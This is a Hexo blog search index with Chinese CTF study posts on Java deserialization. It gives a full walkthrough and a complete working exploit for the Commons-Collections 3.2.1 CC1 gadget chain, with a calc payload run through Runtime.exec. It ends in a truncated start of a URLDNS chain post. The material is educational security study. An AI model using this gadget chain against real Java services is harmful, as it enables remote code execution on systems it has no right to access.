<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java反序列化之CC1</title>
      <link href="/2024/01/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1/"/>
      <url>/2024/01/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是CC链"><a href="#什么是CC链" class="headerlink" title="什么是CC链"></a>什么是CC链</h1><p>CC（Common Collections）是Java中常用的集合框架之一，它提供了一组常见的容器类，如ArrayList、HashMap等。然而，CC链（CC chain）是指利用Common Collections框架中的漏洞来构建的一种攻击链。</p><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><blockquote><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?t=690.4">https://www.bilibili.com/video/BV1no4y1U7E1?t=690.4</a></p></blockquote><blockquote><p>java版本：8u65<br>既然都是cc链了，肯定要有cc依赖，cc版本是3.2.1</p></blockquote><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>起点：CC下的Transformer。</p><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>我们使用<code>ctrl</code> + <code>alt</code> + <code>b</code> 查看实现的类。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705930832668-bead987b-ff31-4ff8-9bc2-bce8b55edc1f.png" alt="image.png"><br>其中我们要用的是InvokerTransformer中的transform。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705931285463-fdbb8ed9-436f-414e-be7d-db4f2b0ce4cc.png" alt="image.png"><br>能注意到有任意代码执行的反射调用。<br>但在此之前我们要知道，任意命令执行，我们应该在哪里执行命令：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705931096635-402d203b-aaaf-4496-a3c4-b2785cbc8eae.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>有了这个，我们再改成反射调用的格式。<br>注意：打出<code>Runtime.getRuntime();</code>点击<code>alt</code>+<code>enter</code>就可以自动补全。<br>改成普通反射的写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * 改成反射</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> runtime.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705932293786-fd6f750f-3a4f-4d2e-8e77-20878d2a7d7f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705932493227-55db672f-aa68-4be7-a7da-28eff4388c91.png" alt="image.png"><br>然后按照InvokerTransformer实例化和transform执行的所需参数填入内容（重新实现这个反射）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * 改成所需的语句格式</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>然后我们需要找到如何才能调用这里，快捷键<code>ctrl</code> + <code>shift</code> + <code>alt</code> + <code>F7</code>查询方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705933367728-2ebd4a89-d300-4cfe-b2b8-866358b01eb0.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705933394856-7752214f-cd8a-4140-8757-f926fd8c357c.png" alt="image.png"><br>通过这种方式来找到所需要的上一个方法。<br>最后找到TransformedMap中的decorate方法来赋值。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934864335-12f317ff-d374-46f2-aec0-d410564a7a02.png" alt="image.png"><br>想实现这个函数，查看其实例化方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934898558-5120148f-7bd6-4ba2-a25f-d8630318220b.png" alt="image.png"><br>并有其赋值decorate方法：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705934935808-cdf32594-903e-4a6e-8453-101bcd9f9612.png" alt="image.png"><br>就是说要让其中的valueTransformer是执行的transfrom的InvokerTransformer。<br>于是可以编写出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// * 往回找，直到能readObject</span></span><br><span class="line">HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">// * keyTransformer没用</span></span><br><span class="line">TransformedMap.decorate(objectObjectHashMap, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure><p>这样写就可以调用transform方法。<br>然后再找如何能调用checkSetValue方法，查找之后发现只有一处AbstractInputCheckedMapDecorator：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705935326866-06c8fe4b-378a-41bf-9814-8a081d710702.png" alt="image.png"><br>可以发现这个类是TransformedMap类的父类，其中的MapEntry的setValue调用了这个方法。<br>而遍历Map的一种写法是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry entry : objectObjectHashMap.entrySet()) &#123;</span><br><span class="line">    entry.setValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能调用到其中的setValue方法。<br>其中setValue中传入runtime参数即可运行。<br>然后就是继续找，如果有readObject下的调用就直接使用。<br>找到AnnotationInvocationHandler的readObject方法下setValue方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705936486495-54eb0a5c-5872-4f35-b272-35d958616cc1.png" alt="image.png"><br>但由于实例化方法不是public，因此只能在包内调用，也就是说只能用反射来调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// * 获取构造器</span></span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorate);</span><br><span class="line"></span><br><span class="line">        serialize(object);</span><br><span class="line">        deserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>最后再加上序列化和反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但还有问题，第一个是setValue的那个传入值是不可以控制的，第二个则是Runtime是不可以被序列化的。</p><h2 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h2><p>先解决如何使用Runtime。<br>虽然，runtime不可以被序列化，但是它的class可以，于是可以写出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后改成InvokeTransformer的版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * 将格式改为InvokeTransformer</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(runtimeMethod);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>可以使用chainedTransformer简化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * 可以使用chainedTransformer来简化，递归调用</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><h2 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h2><p>然后就需要断点调试。<br>给AnnotationInvocationHandler这里打上断点。看看是否能进去。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939191441-a493fdc7-d20f-44f5-aef3-febbd728a102.png" alt="image.png"><br>我们可以注意到，由于memberType是空我们无法进入：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939559083-da3bb388-4cfc-45d3-b7ff-dd00695fbf70.png" alt="image.png"><br>我们需要找到一个有成员方法的class。key改为名字<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939655388-68696c21-c07d-4780-a005-5e780a5c4578.png" alt="image.png"><br>这里没有key这个参数，target中有value这个参数。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939972031-58306759-e75b-4dce-af16-1298cf4f331f.png" alt="image.png"><br>我们改成value试一试，然后将注释改为target。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939746270-68bee3a5-466c-4f45-a463-df5f0b92d95a.png" alt="image.png"><br>再次断点。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705939843986-8bd3c43b-330a-444d-b3ff-1c1c9e07a0c3.png" alt="image.png"><br>但是无法修改最后的value的值，可以使用其中的ConstantTransformer来。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940148759-40f884f4-5d23-4c2b-983e-150a967194cf.png" alt="image.png"><br>也就是在这里加一个让他在Runtime.class中。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940194427-5c89c8b2-74e4-4a0f-8174-7d263592bbe4.png" alt="image.png"><br>ConstantTransformer被传入什么，transform之后就会返回什么。</p><p>最后终于可以成功执行了。QWQ<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705940366991-87bdcb39-b6ee-46c2-9548-7d5c5c4905ca.png" alt="image.png"><br>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fun.natro92;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// * 改成反射</span></span><br><span class="line">        <span class="comment">// Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line">        <span class="comment">// Class aClass = runtime.getClass();</span></span><br><span class="line">        <span class="comment">// Method exec = aClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">// exec.invoke(runtime, &quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// * 改成所需的语句格式</span></span><br><span class="line">        <span class="comment">// Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line">        <span class="comment">// InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line">        <span class="comment">// // * Runtime不可序列化，改为class</span></span><br><span class="line">        <span class="comment">// Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span></span><br><span class="line">        <span class="comment">// Method getRuntime = runtimeClass.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line">        <span class="comment">// Runtime runtime = (Runtime) getRuntime.invoke(null, null);</span></span><br><span class="line">        <span class="comment">// Method exec = runtimeClass.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">// exec.invoke(runtime, &quot;calc&quot;);</span></span><br><span class="line">        <span class="comment">// // * 将格式改为InvokeTransformer</span></span><br><span class="line">        <span class="comment">// Method runtimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line">        <span class="comment">// Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(runtimeMethod);</span></span><br><span class="line">        <span class="comment">// new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line">        <span class="comment">// * 可以使用chainedTransformer来简化，递归调用</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">        <span class="comment">// * 往回找，直到能readObject</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        objectObjectHashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// * keyTransformer没用</span></span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="comment">// for (Map.Entry entry:decorate.entrySet())&#123;</span></span><br><span class="line">        <span class="comment">//     entry.setValue(runtime);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// * 获取构造器</span></span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorate);</span><br><span class="line"></span><br><span class="line">        serialize(object);</span><br><span class="line">        deserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之反射和URLDNS</title>
      <link href="/2024/01/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8CURLDNS/"/>
      <url>/2024/01/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8CURLDNS/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习视频从这里开始看：</p><ul><li>第一部分：<a href="https://www.bilibili.com/video/BV16h411z7o9?t=1105.7&p=2">https://www.bilibili.com/video/BV16h411z7o9?t=1105.7&amp;p=2</a></li><li>第二部分：<a href="https://www.bilibili.com/video/BV16h411z7o9?t=1180.1">https://www.bilibili.com/video/BV16h411z7o9?t=1180.1</a><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2>这里有几个快捷键，可以记忆一下。<br>比如说查看结构：<code>alt</code>+<code>7</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705911881513-def44fe6-1290-402e-ac72-e5d469dc27b3.png" alt="image.png"><br>查看层次结构：<code>ctrl</code> + <code>H</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705911911141-796d9fcd-ccf9-4b57-8857-99b0c8bbfebf.png" alt="image.png"><h1 id="URLDNS-链子构建"><a href="#URLDNS-链子构建" class="headerlink" title="URLDNS 链子构建"></a>URLDNS 链子构建</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2>URL有继承Serializable就证明他是可以被序列化的：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912047710-4b30948a-d2c6-494a-b1ad-21456f7223ce.png" alt="image.png"><br>而且需要使用一个较为常见的函数hashCode：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912179145-ba171de9-9986-41de-bff3-dd8b6bf833c2.png" alt="image.png"><br>调用了handler的hashCode函数，<br><img src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912277976-1cccbd4c-039a-4cd2-9c20-593fb3f00bad.png" alt="image.png"><br>其中的getHostAddress就会对域名进行解析，然后就可以利用。<br>dnslog生成一个网址来测试。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> 